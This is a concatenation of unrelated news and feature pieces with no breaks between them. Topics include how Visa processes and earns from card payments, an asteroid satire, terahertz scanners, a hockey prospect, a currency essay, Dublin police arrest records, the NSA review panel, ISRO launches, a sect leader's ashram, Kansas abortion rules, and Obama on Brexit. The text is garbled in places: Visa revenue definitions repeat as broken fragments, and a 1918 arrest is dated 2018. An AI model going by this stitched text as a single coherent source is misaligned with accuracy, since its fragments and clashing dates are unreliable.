Merchants are the businesses that accept Visa cards as a payment mechanism for their goods and services.
Acquirers are the financial institutions that solicit merchants to accept Visa cards. They offer Visa network connectivity and payments acceptance services to the merchants. They establish the merchant discount rates for card acceptance.
Acquirer Processors are the third party institutions with proprietary technology platforms to handle the transaction processing for those acquirers that do not have in-house capabilities. Acquirers often outsource the transaction processing to the acquirer processors.
A typical Visa transaction begins when the cardholder presents Visa-branded card to a merchant for the payment of goods or services. The first step of the transaction is the authorization. It is the process of approving or declining a transaction before a purchase is finalized. The following diagram illustrates the steps involved in the authorization process.
The cardholder provides a Visa card to the merchant for the payment. The merchant point of sale (pos) terminal reads the account number and other data encoded on the card's magnetic stripe or electronic chip. The merchant terminal transmits the card information and transaction amount to the acquirer or the acquirer processor. The acquirer or acquirer processor combines the transaction information into an authorization request message and transmits it to Visa. Visa identifies the appropriate card issuing bank and routes routes the authorization request to the issuer or the issuer processor for review. The issuer or the issuer processor receives the request and then executes a series of inquiries into its account systems to: assess the potential risk of fraud for the transaction; establish that the account is in good standing; and verify that the cardholder has sufficient credit to cover the amount of the transaction. Then it approves or denies the transaction and returns an authorization response message to Visa. Visa routes the authorization response to the acquirer or the acquirer processor. The acquirer or the acquirer processor transmits the result of the authorization request to the merchant terminal.
If the transaction is approved, the merchant delivers the goods or services to the cardholder. Now, the money needs to be transferred to the merchant account with the acquirer. This is part of the clearing and settlement process.
In the clearing process,
The merchant transmits sales draft information for the transaction, including account numbers and transaction amounts, to the acquirer or acquirer processor.
The acquirer or acquirer processor format this information into a clearing message and transmit it to Visa.
Visa routes the clearing message to the card issuer and calculates the settlement obligation of the issuer and the amount due to the acquirer, net of certain applicable fees and charges.
In the settlement process,
The issuer sends funds to Visa's designated settlement bank in the amount of its settlement obligation.
The settlement bank, at the direction of Visa, transfers funds due to the acquirer.
Now, what do issuers, acquirers, and Visa get out of this transaction. If the cardholder makes a $100 payment, it is not completely transferred to the merchant account. The merchant gets the amount net of the merchant discount fee. If the merchant discount fee is 2.4%, then the merchant would receive $97.60 from the transaction. The rest of $2.40 is split unevenly between the issuer and the acquirer, depending upon the interchange rate. In case of an interchange rate of 1.8%, the issuer will keep $1.80 and the acquirer will keep $0.60. Issuer gets to keep more of the merchant discount fee because of a higher risk of payment default from the cardholder. Visa does not make money from the individual transactions. Instead, it earns revenues from the issuers and acquirers based upon the overall payment volumes and number of transactions processed.
Key Elements Of Visa Business Model
The primary customers of Visa are issuers and acquirers. Visa offers a wide range of branded payments product platforms to the issuers, which they use to develop and offer credit, debit, prepaid, and cash access programs for the cardholders (individuals, businesses and government entities). In addition, Visa provides transaction processing services (primarily authorization, clearing, and settlement) and various other value-added services such as risk management, debit issuer processing, loyalty services, dispute management, and value-added information services.
The primary customers of issuers are cardholders. Issuers issue cards to the cardholders and establish and maintain their accounts. Issuers establish applicable cardholder terms, including fees, interest rates and payment schedules for cardholders. During the payments transactions, issuers authorize cardholder transactions and fund settlement obligations for the cardholders' purchases. Issuers collect the payments from cardholder and assume risk of non-payments or late payments from them.
The primary customers of acquirers are merchants. Acquirers provide the payments network connectivity to the merchants and establish and maintain their accounts. Acquirers establish any applicable merchant fees and/or discount rates. During the payment transactions, acquirers receive settlement funds from issuers and credit merchant for the value of payment transactions. Acquirers assume the risk of merchant non-fulfillment of transaction obligation. Acquirers assume the responsibility for merchant compliance with network security and other rules.
Visa generates revenues primarily from fees paid by the financial institutions based on payments volume (total monetary value of transactions for goods and services that are purchased with Visa-branded cards), transactions processed, and certain other related services.
Visa does not earn revenues from any of the following:
Interest or fees paid by cardholders on Visa-branded cards. The issuers earn that.
Discount fees paid by merchants for the payments acceptance. The acquirers earn that.
Interchange fees. On purchase transactions, the acquirers pay an interchange reimbursement fee to the issuers. Although Visa administers the collection and remittance of interchange fees through the settlement process, Visa generally does not receive any portion of the interchange fees.
VISA operating revenues are principally comprised of service revenues, data processing revenues, and international revenues. These are reduced by costs incurred under client incentive arrangements.
Service revenues . These are earned for providing financial institution clients with the support services for the delivery of Visa-branded payment products and solutions. These are generated from the payments volume on Visa-branded cards and payment products for purchased goods and services.
. These are earned for providing financial institution clients with the support services for the delivery of Visa-branded payment products and solutions. These are generated from the payments volume on Visa-branded cards and payment products for purchased goods and services. Data processing revenues . These consist of revenues earned for authorization, clearing, settlement, network access, and other maintenance and support services that facilitate transaction and information processing. These are generated from the number of transactions processed.
. These consist of revenues earned for authorization, clearing, settlement, network access, and other maintenance and support services that facilitate transaction and information processing. These are generated from the number of transactions processed. International transaction revenues . These consist of revenues earned for cross-border transaction processing and currency conversion activities. These are primarily generated from cross-border payments and cash volume.
. These consist of revenues earned for cross-border transaction processing and currency conversion activities. These are primarily generated from cross-border payments and cash volume. Client incentives. These consist of long-term contracts with financial institution clients for various programs designed to build payments volume, increase Visa-branded card acceptance, and win merchant routing transactions. These incentives are accounted for as reductions to operating revenues.
The following diagram shows the key elements of Visa business model. It shows how the money flows-in from the different customer segments and the key operating expenses where the money flows-out to.
How Visa Business Model Is Different From American Express?
Visa and American Express both offer payment cards. But, their approach to making money is different. Visa operates an open-loop network and has a transaction-centric business model. American Express operates a closed-loop network and has a spend-centric business model.
In a closed-loop network, payment services are provided directly to the cardholders and merchants by the owner of the network. American express acts as both the issuer and the acquirer. American Express makes money primarily from the merchant discount fees. It focuses on generating revenues primarily by driving spending on its cards through attractive reward programs for card members. This helps them earn more discount revenue from merchants. Hence, they have a “spend-centric” business model.
Open-loop networks are multi-party and operate through a system that connects issuers and acquirers. The network owner manages the information and flow of value between them. Visa operates an open-loop network. Visa does not make money from the merchant discount fees or cardholder membership fees. Merchant discount fees is split unevenly between the issuers and acquirers depending upon the interchange rate. VISA earns revenue primarily on the payments volume and the transactions volume carried out through their cards. Hence, Visa has a “transaction-centric” business model.
VISA FY 2015 Revenues, Profits, And Profit Margins
Visa generated a total of $13.9 billion operating revenues in FY'15 (fiscal year ending September'15). The operating revenues are comprised of:
Service revenues of $6.3 billion
Data processing revenues of $5.6 billion
International transaction revenues of $4.1 billion
Other revenues of $823 million
Client incentives of -$2.9 billion. Client incentives is a contra-revenue account and consists of long term contracts that Visa has made with their clients to increase payments volume and Visa brand acceptance. They are not realized as an expense, but are instead directly subtracted out of the total revenues.
Of the $13.9 billion of Visa operating revenues in FY'15, $4.8 billion were the operating expenses. The operating expenses are comprised of personnel expenses, marketing expenses, network and processing expenses, professional fees, depreciation and amortization, and general and administrative expenses. This resulted in $9.1 billion of operating profit and an operating margin of 65.3%. Operating margin is calculated as operating income divided by total operating revenues. After income taxes and other, Visa had a net profit of $6.3 billion and a net margin of 45.6%.
When it comes to asteroid attacks and your nation, principality, or sovereign city-state, a simple “who knows?” or “what can even be done to prevent asteroid attacks?” or “what the hell are you talking about?” isn't going to cut it for much longer.
“The U.N. plans to set up an International Asteroid Warning Group for member nations to share information about potentially hazardous space rocks,” Scientific American reports. “If astronomers detect an asteroid that poses a threat to Earth, the U.N.'s Committee on the Peaceful Uses of Outer Space will help coordinate a mission to launch a spacecraft to slam into the object and deflect it from its collision course.”
Scientific Asteroid, the meteor-community's most popular astronomical journal, does not think slamming a spaceship into “the object”—which has a name and a family and a rich interior life, by the way—should qualify as a “peaceful use of outer space” and fall under the jurisdiction of the Committee on the Peaceful Uses of Outer Space. The magazine's scathing op-ed by prominent astroid/cultural critic David Rocks dares ask: “Is there a U.N. Committee for the Inconsiderate Uses of Outer Space that might be better equipped to ‘slam and deflect'?” You really have to read the whole thing. Very powerful.

Yes, you read that headline correct.ESPN will be broadcasting halftime shows from the SEC this year. Now here is the catch. The only games they will broadcast, as of right now, are games that they cover on the SEC Network and the only way for you to watch them is on the Watch ESPN app on your phone or computer.Last night without much fanfare, ESPN broadcasted the Tennessee halftime show and we by chance happened to catch it. As far as we can tell the only significant notification about it was this single tweet:Yes, it really happened. There was no big announcement from ESPN, so we are assuming that this is a pilot for now and hopefully will expand to all games that ESPN covers. The on air commentators did mention it a few times before halftime which helped to spread the word.Over the past few years, ESPN has broadcasted the halftime shows of the College Football Playoff online and on the ESPN Classic Sights and Sounds feed. The response from the band world has been quite large and positive.Here's hoping that more of this is in our future, but for now we'll take each baby step as they come.We will continue to monitor this for you and update this story if we are able to get more clarification from ESPN.

A scanner using T-rays, a harmless form of electromagnetic radiation, could make that possible, researchers at the U.S. Department of Energy's Argonne National Laboratory said on Tuesday.
“At airports we have to take off our shoes,” Ulrich Welp of Argonne's Materials Science Division said in a telephone interview. “It is kind of a nuisance.”
Using T-rays, it would be possible to examine travelers' shoes without the need to disrobe, he said.
T-rays have been difficult to generate without using a host of bulky equipment. But researchers at Argonne have found a simple way to generate T-rays — terahertz radiation — using special, high-temperature superconducting crystals in a compact device.
“We developed a new source for terahertz radiation,” Welp said. The work, done with researchers in Turkey and Japan, represents “a big step forward,” he said.
T-rays are part of the electromagnetic spectrum that lies between microwaves on the low end and infrared radiation on the high end.
Unlike conventional X-rays, which can cause cell damage, T-rays do not have enough energy to alter cell ionization, which can lead to radiation sickness or cancer.
And while they cannot see through metals or water, they can penetrate many common materials like leather, fabric, cardboard and paper.
“Terahertz radiation is sensitive to characteristics of a lot of chemicals,” Welp said, offering the promise of new uses in airport scanners or detecting illicit chemicals or weapons that could not be picked up by an X-ray.
T-rays can also penetrate about four-tenths of an inch through human skin, offering some medical applications as well.
“Tests have shown this could be a viable diagnostic tool for skin cancer and the spread of skin cancer under the surface of the skin. You could diagnose without having to do an operation,” Welp said.
“It has been demonstrated that it can detect tooth decay without having to take an X-ray,” he said.
Welp said he and colleagues still have a lot of fine-tuning to do, but the discovery offers a lot of promise.
One year ago, the Minnesota Wild selected the 19-year-old in the second round (46th overall) of the 2013 NHL Entry Draft. Come fall, he started his freshman year at Colorado College.
After a natural adjustment period to college life, the defenseman played for Team Sweden at the International Ice Hockey Federation's World Junior Championship. He picked up a goal and five points with a plus-five rating in seven games en route to a silver medal finish. But the blueliner wasn't done making strides just yet.
At the end of CC's disappointing 7-24-6 season, Olofsson signed an entry-level deal with Minnesota on March 24 and packed his bags for Iowa, playing in eight games with the Wild's American Hockey League affiliate.
“It all flew by,” he said. “From the time that I got drafted, I never really sat back. It's all been motivating and a push to have that in the back of my head during the year. Everything kind of took care of itself. I just focused on playing and I ended up playing my best hockey in Iowa. It was really a pretty good year overall.”
A Confidence Boost
In the weeks leading up to the 2013 Draft, Olofsson's stock was on the rise. After a solid year in the United States Hockey League with the Green Bay Gamblers — he registered two goals and 23 points with a plus-11 rating and 59 PIM in 63 games played — he earned an invitation to the 2013 Scouting Combine.
After the Combine he was rated the 51st skater in North America. According to Assistant General Manager Brent Flahr, the year the young defenseman put together prior to the draft caused him to rocket up the Wild's draft board. Without a first round pick, Minnesota selected him in the second round.
“In the second half of the season before we drafted him we saw him really take off,” Flahr said. “We were happy to get him and saw him in the summer and just his natural ability was pretty apparent when he came to Development Camp. His upside is exciting.”
Heading into the draft, the blueliner's lone expectation was getting selected. It didn't matter where or when, all that mattered was hearing his name called.
“It would just be another step in that realization that you're in an organization, that you know what you're working towards,” Olofsson said. “I was obviously thrilled with Minnesota; I couldn't be happier with that organization. It's just kind of a recognition in your head that this is where you're going and this is a step you need to take.”
Going in the second round made the moment a little sweeter. Hearing his name called early was an acknowledgement of all his hard work and a step in achieving his NHL dreams, giving his confidence a nice boost and launching off his whirlwind year.
“It's just a confidence thing and something that I felt pretty honored to have,” Olofsson said.
A Coming Out Party
The whirlwind season didn't exactly take off from the start.
In his fresman year, he suffered an early set back with an injury at the beginning of the season. Once healed, Olofsson became a fixture on the Tigers' blue line, playing in 30 of CC's 37 games with four goals and eight points.
Despite the sluggish start, he hit his stride mid-season at the WJC in Malmo, Sweden on the host country's roster. Beyond winning the silver medal, the Umea, Sweden native led all Swedish defensemen with his play in the tournament.
“That kind of opened everybody's eyes that maybe didn't know him as well before,” Flahr said. “He got a lot of recognition.
“For a kid like this, I don't even know if he thought the draft was realistic coming into his season. So from that to being drafted in the second round and going to World Juniors — he wasn't even necessarily recognized in his own country — he opened a lot of people's eyes last year in Sweden and over here.”
Olofsson's confidence stayed on the rise after the WJC and after an up and down year at CC, it was was buoyed further a few weeks later when he inked an entry-level contract with the Wild.
After one year in college, in which he grew on and off the ice, leaving was a difficult choice.
“It was tough,” Olofsson said. “There are things that everyone likes to accomplish. But I felt like, for my hockey career, I needed to go. It was obviously something I talked about with my family and something that I worked through for a while, but in the end it felt right.”
A New Transition
When the 19-year-old made the move to Iowa, the Wild was nearing the end of the regular season and out of playoff contention.
The blueliner played in eight games netting one goal. In that short time, he felt his game was coming together, playing what he considered was his best hockey of the year.
“When I came to Iowa it just felt like everything came into place,” Olofsson said. “Playing there has prepared me now for what I'm working towards during the summer and where I want to be next year.”
While his play was on point, the transition to Iowa was a unique experience. At the time, Iowa was in the middle of one of its longest road trips of the season — a five-game spread over a week and a half. Rather than settling into life in Des Moines, Olofsson was quickly reintroduced to life on the road — settling into hotels while bussing from city to city.
“That was a bit different, especially since I was used to playing college hockey every weekend and not having that amount of travel,” Olofsson said. “It was kind of like junior hockey. It didn't take me long to adjust but it was good to get a taste of that at the end of the year.”
With a taste of life on the road, the youngster also bit off a healthy portion of playing with professionals in the AHL — against guys playing night in and out, vying for that call-up to the Show.
Though he appeared in only eight games, that time set the tone for his summer, knowing what he'll be up against next season.
“You obviously know how well off physically your teammates and opponents are so that's something you take into the summer and compare yourself to in your own strides and goals,” Olofsson said. “That's kind of been my motivation now and I know where I need to be at the start of next year.”
Flahr noted that the defenseman still has some work to do in the weight room and needs to grow into his body, but the Wild remain excited about his potential, especially given how far he's come in recent seasons.
“To see where he's come from just a year or two ago to where he is now, it's pretty impressive,” Flahr said. “He's grown a lot and just advanced to higher levels and really made transitions quickly and smoothly. That's really helped him. He's a type of kid, I think, if he does the things he needs to, he can transition pretty quickly through the pro ranks.
“A couple years ago he's playing midget hockey in Colorado and now he's a step away from the NHL.”
It's important to understand how money works, and it's counterintuitive. One aspect which is missed in the debate between commodity-backed currencies and fiat currency, that is to say currency which is not backed by a commodity or anything else, is the fact that all currencies are really fiat currencies*.
Nothing illustrates this better than this story in New York Magazine that reports that Tide detergent has become a black-market currency in the drug trade.
It's become a meme in pop culture that cigarettes are often used as currency in prison (I have no idea whether this is still in fact true). We all instinctually understand how a cigarette-based currency system would work, right: people would mass cigarettes, use them as a medium of exchange and store of value, etc., but we don't think about the implication.
In both cases, what makes Tide detergent, or cigarettes, or the US dollar, or Bitcoin, or whatever, a currency, is simply common agreement that these an item of currency is valuable. What makes it possible to buy drugs with Tide is not because Tide is useful as a detergent. It's because drug dealers and users have agreed that it is currency.
This is, of course, equally true of gold. Gold's uses in industry are marginal to its appeal. What makes gold valuable is that we've all agreed since time immemorial that it's valuable.
Switching to a gold-backed currency regime does not mean switching away from fiat currency, it means switching to a fiat currency system where the money supply is linked to a commodity.
This is one of those things where our instincts fight our good sense. We want to believe things have intrinsic value, whereas value in a marketplace is determined by supply and demand, not anything intrinsic. It's scary to think that the US dollar is backed by "nothing", until you realize that any currency system is backed by "nothing", or rather by the same thing, which is a common agreement to use the currency.
(* Actually, properly understood, no currencies are "fiat" currencies, since the word "fiat" refers to a government decree that makes money money, but in reality, while the government fiat matters, it is useless without the consent of the currency users. But insofar as we use the expression "fiat currency" to refer to currencies that have no "intrinsic value", then all currencies are fiat currencies.)
The Muslim community of Michigan has stepped forward this week with a contribution of $100,000 to support Detroit residents who are facing hardship from water shut offs.
More than 60,000 households in Detroit have faced the risk of water shut off or are struggling to recover from water damage due to recent floods. The grant from the Michigan Muslim Community Council in partnership with Islamic Relief USA – the largest Muslim charity organization in the United States – will be used in direct assistance to disadvantaged Detroit families struggling to maintain their water utilities. The groups hope that this grant will encourage others to come forward with assistance since there is still great need.
“We are hoping this is going to be contagious,” said Islamic Relief CEO, Anwar Khan. “It is important to us in our faith to help our neighbors. It is a part of our faith to help our friends.”
Islamic Relief USA had provided disaster relief teams to metro-Detroit to help with recent Detroit flooding, and has partnered with local groups to offer Disaster Assistance Response Training to residents in order to have a group of trained individuals who can help if future disasters strike this area.
Detroit Mayor Mike Duggan led an effort to provide water relief to disadvantaged families by setting up the Detroit Water Fund and a plan for residents to receive help. Other major donors to this effort include Ford and GM who each donated $50,000, and the United Way which donated $100,000.
The grant is part of a concerted effort by metro-Detroit Muslims to contribute to the city's revitalization because Detroit has been an important part of American Muslim history and is recovering from difficult economic times. Other initiatives include the Huda clinic, which provides free medical and dental clinic to all; Zaman International, which provides food and material assistance to at risk-women and children; DREAM (Detroit Revitalization Engaging American Muslim), which reclaims and renovates homes for disadvantaged families; and the Ramadan Fight Against Hunger Food Drive and Oedhiya project, which distributes several tons of food and meat annually to local food banks and community centers.

LIFE IN DUBLIN in the early 20th century was tough, especially given the huge class divide. However, it was also a time of remarkable change.
Newly-released digitised Dublin Metropolitan Police records show us what life was like from 1905 to 1918.
The records cover some of Dublin's major historical events, including the 1913 Lockout, the 1916 Rising and its aftermath. Over 30,000 people were arrested during this period and these details are all contained in the records.
The UCD Digital Library partnered with SIPTU and the Garda Museum and Archives to present four volumes of records which are available online here.
Life at the time
During 1916, many people living in Dublin were quite poor and had terrible housing conditions. Thirty-six per cent of housing consisted of one-room tenements. Thirty per cent of infants in Ireland died because of malnutrition and weakness.
There were many arrests around this time for stealing. In the records you can see examples of the items taken including “onions and apples” and “boots” and “minerals from a shop”. You can also read the details of cases like the four teenage girls who were arrested for stealing wool from a bale at North Wall and the 38-year-old man was arrested for stealing pencils.
Pádraig Yeates, one of the main people behind getting the books together, said that the records give new insights into this revolutionary period.
He said:
For instance, one thing that immediately jumps out is the presence of British army soldiers in these records and the absence of insurgents. Over a quarter of all men arrested in Dublin in 1916 were soldiers, mainly absentees and deserters
Here are some of the arrests that caught our attention…
1. Séan Lemass (as John Lemass) arrested for manslaughter

Seán Lemass, former Irish Taoiseach, was arrested on 29 January 1916 for manslaughter. Lemass accidentally shot his two year old brother, Herbert.
The revolver went off by mistake in the family's living room on Capel St and Herbert died in Temple Street Hospital from a head wound left by the bullet. Lemass, as shown in the records, was only 16 and a half years old at the time.
This is a little-known part of Lemass' history, even his biographers did not mention the event. Eunan O'Halpin, a Trinity Professor in contemporary Irish history, wrote about the incident in The Irish Times.

The 1913 Lockout was the culmination of months of disagreements between William Martin Murphy, who owned the Irish Independent and controlled the Dublin Tramways Company, and the Irish Transport and General Workers' Union (ITGWU).
On 15 August 1913, Murphy told his workers they had the choice of the union or a job. Any worker who didn't sign a pledge to disown the union were “locked out”.

James (Jim) Larkin's arrest was one of the standout scenes of the Lockout. Larkin was highly involved in representing the workers during the Lockout.
On 31 August, Larkin snuck into the Imperial Hotel, owned by Murphy, and addressed the crowd for a few minutes, before being arrested for “incitement to crime”.
He was released on bail in September. He was sentenced two months later, on 27 October, to seven months in prison. He was released early from Mountjoy Prison on 13 November.
James Connolly was arrested for ‘incitement to crime' on 30 August 1913. He had been coming from Belfast to help run the strike. His sentence was to pay £200 bail money or face three months in jail. He went to jail but was later released after going on hunger strike.
3. Revolutionaries' arrests in 1918

Two years after the Easter Rising, many of the main revolutionaries were still catching the attention of the Dublin Metropolitan Police.
W T Cosgrave, who succeeded Michael Collins as the President of the Free State, was arrested for the offence of “Defense of the Realm” on 17 May 2018. He was marked down as 38-year-old with the occupation of “publican”.
Constance Markievicz's arrest is filled in directly after Cosgrave for the same offence. She was 40 at the time and gave her occupation as “none”.

Count George Noble Plunkett, father of the 1916 Proclamation signatory Joseph Mary Plunkett, was also booked for the same offence. The 69-year-old gave his occupation as “gent”. What a boss.
Slightly further down the page, revolutionary Maud Gonne McBride, (W B Yeats' love interest) was arrested and “handed over to military for internment”.
The punishments
Many of those arrested had to pay fines or face a prison service. There were also some more unusual repercussions.
Michael Saufey received “6 strokes of rod” after stealing apples. Francis Keegan and J J Ashe also got the same sentence after robbing minerals.
Twenty-three year old Kathleen Mallingham was arrested in 22 August 1916 for keeping a brothel. She had to pay £25 “to keep peace”.

President Obama's NSA review panel makes it clear that many of the things NSA has been doing are bad from a policy perspective. But the real question we should be asking is: are they legal?
Early leaks about the review panel suggested it had found all the NSA's (and other agencies they imply, such as FBI) activities to be legal. That's based, in part, on this statement:
Significantly, and in stark contrast to the pre-Fisa era, the Review Group found no evidence of illegality or other abuse of authority for the purpose of targeting domestic political activity. This is of central importance, because one of the greatest dangers of government surveillance is the potential to use what is learned to undermine democratic governance. On the other hand, as discussed later in this report, there have been serious and persistent instances of noncompliance in the Intelligence Community's implementation of its authorities. Even if unintentional, these instances of noncompliance raise serious concerns about the Intelligence Community's capacity to manage its authorities in an effective and lawful manner.
But notice that statement did not say the panel had found everything to be legal. On the contrary, it applied that judgment only to illegality or abuse "for the purposes of targeting domestic political activity". That leaves open a whole slew of potential abuse, even illegal activities, targeting Americans for reasons outside of politics.
That's what the report should have tackled, but it didn't. Instead, we have tame sounding "policy recommendations" as if this is all just a matter of political disagreement over the budget or farm bill.
A later statement on the phone dragnet is equally ambiguous:
We have not uncovered any official efforts to suppress dissent or any intent to intrude into people's private lives without legal justification.
Fine, but this leaves the possibility of unofficial efforts to suppress dissent or intruding into people's lives with dodgy legal justification.
Perhaps one signal the report won't comment on legality is it is conspicuously silent about President George Bush's "presidential" wiretap program, which top Department of Justice officials refused to authorize as lawful in 2004, in its section on legal issues. Later in the report, it briefly notes that Bush's program operated outside Fisa. Funny, that's the same thing some of President Obama's programs currently do.
Beyond the emphasis on the "serious and persistent instances of noncompliance", there are other moments where the report points to issues of concern.
For example, the report emphasizes that EO 12333 – the executive order used both to authorize Bush's illegal surveillance program and much of the dragnet currently – only governs "foreign intelligence activities not governed by Fisa". Yet the administration appears to have continued internet metadata collection more broadly under EO 12333. Furthermore, according to a Washington Post report, the NSA has taken data (that is governed by Section 702 of Fisa) from Google and Yahoo cables overseas. The report stresses the limits of EO 12333, but another way to read into that is that it suggests the executive branch continues to overstep it authority.
Then there are places where the report airs questions about the legal interpretations the executive branch (and the Fisa court) adopted – noting that critics argue the phone dragnet rulings have done "violence" to the meaning of the word "relevant" – but then insisting that the review's "charge is not to resolve these questions, but to offer guidance from the perspective of sound public policy as we look to the future". Yet elsewhere, the report states the 2005-06 Patriot Act standard, "leaves too little authority in the FISC to define the appropriate parameters of section 215 orders".
For these reasons, some of the areas where the report remains silent are the most intriguing. One example: when the report discusses the kinds of things, in addition to phone metadata, the government can collect under Section 215, it lists some possibilities, including bank records, credit card records, medical records, travel records, internet search records, and email records. It claims, "the government has expressly disclaimed any interest in such mass collection of personal information under section 215". Yet we know the government has used section 215 to collect purchase records of explosives precursors. And we know the Fisc has imposed minimization procedures on more and more of the government's 215 orders in recent years – doing so for 176 orders last year – which is the hallmark of some kind of bulk program. The report may say the government doesn't collect these items, but it's collecting something – probably a lot of somethings – in bulk, and the report warns the president that such bulk collections "seem both unrealistic and unsound as a matter of public policy".
The same applies even more with the report's recommendation that "governments should abstain from penetrating the systems of financial institutions and changing the amounts held in accounts there". Huh? There have not yet been any allegations from the Snowden reporting that the NSA has done this (though it has hacked into financial data to collect it). And the recommendation is presented as a kind of best practices that all governments should adhere to, not something that would apply solely to the US. But it does raise questions about whether the review panel knows that such activities have been going on. (It's not at all clear this would be illegal; just unwise.)
There are hints like this in a number of places the report, all presented as a discussion of policy. That, of course, permits the president to accept or reject these recommendations, as a matter of policy. But underneath it all, there's a warning that the dragnets and the president's EO 12333 activities may be wrong both on policy and on legal grounds.

New York Red Bulls boss Jesse Marsch is as honest as they come, and this week on EoS Radio, he addresses much of the team's issues – including the status of Amobi Okugo.
The California native has been trialing with the Red Bulls for weeks now, but Marsch reveals he will no longer be an option for the club.
“We decided not to pick up Amobi,” Marsch tells EoS Radio. “It was a tough decision because he actually did well, but we also feel we need to make a decision for the long term as well — not just a bandaid.”

Two years after it stunned the world by launching the world's cheapest Mars orbiter mission in its first attempt, India's space agency, the Indian Space Research Organisation (ISRO), launched as many as 34 satellites into space in 2016. These included 22 foreign satellites and 12 Indian ones.
India's indigenously-developed Polar Satellite Launch Vehicle (PSLV) and Geosynchronous Satellite Launch Vehicle (GSLV) did most of the heavy lifting, carrying 33 of these satellites. Only one of ISRO's satellites was put into orbit through French company Arianespace because of its heavier weight, which the Indian space agency can't yet handle.
In September, ISRO sent 20 satellites into orbit on one rocket, the highest number it has launched in one go. But that feat will soon be bettered as the agency is now gearing up to launch a record 83 satellites in one go—setting a world record—in Jan. 2017.
Of the 83 satellites, 80 belong to Israel, Kazakhstan, Netherlands, Switzerland and the US. The remaining three belong to India.
These exploits are helping to rake in the moolah. The Indian space agency's commercial arm, Antrix Corporation, currently has an order book of Rs500 crore ($73 million), which is expected to increase by another Rs500 crore if ongoing negotiations are successful. Globally, the satellite industry stood at $208 billion in 2015, according to Washington DC-based Satellite Industry Association.
“Launch capacity globally is limited,” AS Kiran Kumar, chairman of ISRO, told Bloomberg last month. “Why are people coming to us? Because they are looking for the most cost-effective, short turnaround-time launches.”
This year, ISRO also made headway with its indigenous space shuttle programme. On May 23, the space agency successfully tested a prototype of a reusable space shuttle, which was about six times smaller than the final planned vehicle. Around 600 scientists at ISRO have been working on the space agency's shuttle programme for a decade now. If and when the final shuttle is built, India will be among the select few countries to have such a vehicle as part of their space programmes.
“We need more and more capacity, launch capacity,” Kumar said on Dec. 27. “We are working toward that. Our effort is to continuously increase.”
Here is a list of ISRO's successes through 2016.
It's 12 acres of luxury — the best money and blind faith can buy.
The Satlok Ashram of controversial sect leader Rampal Dass, arrested in a late-night swoop Wednesday and ordered in judicial custody till November 28 the next day by the Punjab and Haryana high court, is built like a fortress, surrounded by high walls with watchtowers.

“The ashram is built like a fort meant to ward off an invasion. It reminded me of the Agra fort,” said a senior police officer who was part of the Operation Samvedi (sensitive) conducted over three days to nab the “mouse”— codename for the 63-year-old engineer-turned-preacher.
The “fortress” saw bloody clashes Tuesday as the police tried to storm the ashram to arrest Rampalfor contempt of court after he repeatedly failed to appear in the HC in a 2006 murder case.
On Thursday, the court cancelled Rampal's bail in the case even as two more murder cases were slapped against him after six people died in the stand-off.
Cops examine the chair from the area from which Rampal delivered his sermons. (Gurpreet Singh/HT photo)When HT team visited the complex, which came up in four years, at around 1.40pm, thousands of Rampal's followers were still inside, most of them in the prayer (satsang) hall — the centre piece of the sprawling complex.
By evening, the police, who searched the ashram, had managed to move out 4,000 people.
The hall that can seat 50,000 has a special enclosure from where Rampal, who claims to be a devotee of mystic poet Kabir, delivered sermons from a hydraulic chair as his private militia stood guard. Separate sitting areas are marked for men and women. Dozens of air-conditioners and hundreds of fans can be seen. A local police officer gave the break-up: 10,000 ceilings and 1,000 exhaust fans under one roof.

A private swimming pool, state-of-the art elevators, 24 AC rooms with attached bathrooms fitted with top-of-the line fixtures, Rampal, whose followers largely come from low-income strata, lived big. One of the rooms had a massage bed, another treadmills as Rampal stared down from huge wall posters. When reports last came in, the police were trying to break open lockers that were there in most of the rooms.
The ashram is one of several Rampal has. Though there is no property Rampal's name, his Kabir Parmeshwar Bhakti Trust owns large chunks of land in Haryana and is building another ashram in MP. “The ashram owns dozens of buses and vehicles. So far, about 100 vehicles have been impounded,” Hisar deputy commissioner ML Kaushik said.
Sources said there were indications that around 24 firearms were found in the ashram but the police were not ready to confirm it.

The murder of Dr. George Tiller in Wichita in 2009 changed the landscape for women in the state of Kansas and the medical personnel who provide services to them. The election of Sam Brownback as governor last November was greeted with cheers by the right wing, as it created the opportunity to take advantage of the new abortion rights landscape. Earlier this year, the legislature quickly turned those hopes into bills, and sent them on to Brownback's desk, which he signed in mid-May.
They passed a new law to prohibit insurance companies from including coverage of abortions in their general policies (except those necessary to save the woman's life), though supplemental policies can cover this. They also passed a law stiffening licensing requirements for facilities that provide abortions, including a ban on using telemedical systems in conjunction with prescribing RU-486, and directing the KS Department of Health and Environment to write new regulations regard exits, lighting, equipment, etc. — all in an effort to strangle anyone who wants to provide an abortion in the state of Kansas. The new regulations [pdf] were approved on Thursday, June 17th, just a few weeks after the law was signed.
The kicker? They take effect July 1, with no exceptions.
These are temporary regulations, that must be opened up for a four month public comment period. But even temporary regulations must be approved by the State Rules and Regulations board, which has helpfully slated a meeting for next Wednesday to take up the matter.
That's June 29th, for those of you putting together your timelines at home.
The right wing cheered:
Some anti-abortion activists in Kansas had expressed optimism new KDHE mandates to be implemented July 1 would result in temporary or permanent closure of clinics in Kansas performing elective abortions. Troy Newman, president of Operation Rescue, said failure of the three clinics would be a triumph. “We have doubts that any of the abortion clinics can meet the safety requirements of the new law,” he said.
That's their goal: to make Kansas the first state with no legal abortion facilities anywhere in the state. This death-by-regulation strategy has already claimed its first victim, leaving only two other providers in the state. From the KC Star:
[Clinic lawyer Chertyl] Pilate said the clinic hardly had a chance to comply with new temporary regulations because it received them from state regulators Monday. “We were expected to comply in a nanosecond,” she said. “The timeline was absurdly unrealistic.” The three Kansas abortion clinics have been racing to meet the licensing requirements spelled out in the new law, which was one of four new abortion restrictions passed by the Kansas Legislature this year. The requirements have been met with skepticism by abortion-rights groups, given the prevailing mood against abortion in the Kansas Capitol. “What we have isn't a democratic government. We have a theocracy,” said Ronald Yeomans, a physician who practices at the Wyandotte County clinic. “We have a theocracy with a bunch of extremists, right-wing Republicans who are trying to enact their religious views into law.”
Dorothy, you're not in Kansas anymore. It's looking more and more like Gilead.
US President Barack Obama arrives in the UK on Thursday to urge the British public to vote to ‘remain' in the European Union in the June 23 Brexit referendum. Since the presidential visit was announced, however, critics have told him to “butt out.”
His appearance will be welcomed by the pro-EU campaign and Prime Minister David Cameron.
Obama is expected to reiterate his view that Britain's “special relationship” with the US is best served by remaining in the union.
However, Brexiteer and UKIP leader Nigel Farage has said “President Obama should butt out.”
“This is an unwelcome interference from the most anti-British American president there has ever been. Mercifully, he won't be in office for much longer,” Farage said.
